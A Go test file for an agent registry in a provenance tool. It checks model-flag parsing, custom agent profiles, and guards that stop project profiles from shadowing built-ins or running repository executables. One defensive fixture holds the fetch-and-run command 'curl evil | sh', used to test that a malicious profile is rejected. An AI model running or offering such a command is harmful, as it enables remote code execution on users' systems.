package agent

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/seralith-hq/seralith/internal/project"
	"github.com/seralith-hq/seralith/pkg/provenance"
)

func TestDeclaredModel(t *testing.T) {
	r := NewRegistry(nil)
	codex, _ := r.Get("codex")
	cases := []struct {
		args []string
		env  []string
		want string
	}{
		{[]string{"codex", "-m", "gpt-x"}, nil, "gpt-x"},
		{[]string{"codex", "--model=local-7b"}, nil, "local-7b"},
		{[]string{"codex"}, nil, ""},
	}
	for _, c := range cases {
		if got := codex.DeclaredModel(c.args, c.env); got != c.want {
			t.Errorf("DeclaredModel(%v) = %q, want %q", c.args, got, c.want)
		}
	}
	claude, _ := r.Get("claude")
	if got := claude.DeclaredModel(nil, []string{"ANTHROPIC_MODEL=a", "ANTHROPIC_MODEL=b"}); got != "b" {
		t.Errorf("env model = %q, want last value", got)
	}
}

func TestRegistryCustomAndGuess(t *testing.T) {
	r := NewRegistry([]project.AgentProfile{
		{ID: "inhouse", Command: []string{"/opt/tools/inhouse-agent"}, ModelFlags: []string{"--llm"}},
		{ID: "pairing", Kind: "human", Command: []string{"tmate"}},
	})
	p, ok := r.Guess([]string{"/usr/local/bin/inhouse-agent", "--llm", "mistral"})
	if !ok || p.ID != "inhouse" || !p.Custom || p.Kind != provenance.ActorAgent {
		t.Fatalf("guess = %+v ok=%v", p, ok)
	}
	if p.DeclaredModel([]string{"x", "--llm", "mistral"}, nil) != "mistral" {
		t.Fatal("custom model flag not honored")
	}
	if h, _ := r.Get("pairing"); h.Kind != provenance.ActorHuman {
		t.Fatal("custom human profile has wrong kind")
	}
	if s, ok := r.Guess([]string{"/bin/zsh"}); !ok || s.ID != "shell" {
		t.Fatalf("shell guess = %+v", s)
	}
	if _, ok := r.Guess([]string{"make"}); ok {
		t.Fatal("unknown command matched a profile")
	}
	if len(r.Detect()) != len(r.All()) {
		t.Fatal("detect should report every profile")
	}
}

func TestProjectProfilesCannotReplaceBuiltins(t *testing.T) {
	r := NewRegistry([]project.AgentProfile{
		{ID: "shell", Kind: "human", Command: []string{"sh", "-c", "curl evil | sh"}},
		{ID: "claude", Command: []string{"./tools/claude"}},
		{ID: "a-claude", Command: []string{"./tools/claude"}},
	})
	if got := r.Shadowed(); len(got) != 2 || got[0] != "shell" || got[1] != "claude" {
		t.Fatalf("shadowed = %v", got)
	}
	if s, _ := r.Get("shell"); s.Custom || s.Command[0] != defaultShell() {
		t.Fatalf("shell replaced: %+v", s)
	}
	if p, ok := r.Guess([]string{"claude"}); !ok || p.ID != "claude" || p.Custom {
		t.Fatalf("guess preferred a project profile: %+v", p)
	}
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "tools"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "tools", "claude"), []byte("#!/bin/sh\necho 9.9.9\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Chdir(dir)
	custom, _ := r.Get("a-claude")
	if v := custom.ToolVersion(context.Background(), nil); v != "" {
		t.Fatalf("repository executable was run: %q", v)
	}
}

func TestActor(t *testing.T) {
	r := NewRegistry(nil)
	shell, _ := r.Get("shell")
	a := shell.Actor(context.Background(), "dev@example.com", nil, nil)
	if a.Kind != provenance.ActorHuman || a.ID != "dev@example.com" {
		t.Fatalf("human actor = %+v", a)
	}
	aider, _ := r.Get("aider")
	b := aider.Actor(context.Background(), "dev@example.com", []string{"aider", "--model", "m"}, nil)
	if b.Kind != provenance.ActorAgent || b.Operator != "dev@example.com" || b.Model != "m" || b.ID != "aider" {
		t.Fatalf("agent actor = %+v", b)
	}
}
